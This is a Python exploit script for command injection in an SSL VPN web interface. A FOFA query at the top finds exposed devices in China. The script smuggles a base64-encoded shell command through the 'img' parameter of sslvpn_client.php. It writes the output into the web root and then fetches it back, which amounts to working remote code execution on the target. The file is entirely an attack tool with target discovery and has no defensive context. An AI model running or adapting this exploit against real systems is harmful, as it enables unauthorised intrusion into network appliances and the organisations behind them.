#fofa: body="/webui/images/default/default/alert_close.jpg" && country="CN"
import requests
import urllib3
import random
import string
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)




def generate_random_letters():
    length = random.randint(6, 8) 
    letters = string.ascii_lowercase  
    result = ''.join(random.choice(letters) for _ in range(length))
    return result+'.txt'


def verity(url,filename):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",}
    path = "/sslvpn/"+filename
    res = requests.get(url+path,verify=False,headers=headers)
    if res.status_code == 200:
        print("[*] 写入执行结果到： {} 执行结果：".format(url+path))
        print("\033[32m{}\033[0m".format(res.text))
    else:
        print("The target not vule!")

def payload_send(url,cmd):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",}
    filename = generate_random_letters()
    cmd = base64.urlsafe_b64encode(cmd.encode("utf-8")).decode("utf-8")
    payload = "/sslvpn/sslvpn_client.php?client=logoImg&img=/tmp|echo%20{}|`base64%20-d`|tee%20/usr/local/webui/sslvpn/".format(cmd)+filename
    urls =  url + payload
    res = requests.get(urls,headers=headers,verify=False)
    verity(url,filename)

    


if __name__ == '__main__':
    import sys
    
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
    except:
        print('Usage: python3 exp.py http://127.0.0.1 whoami or "ifconifg -a"')
    payload_send(url,cmd)


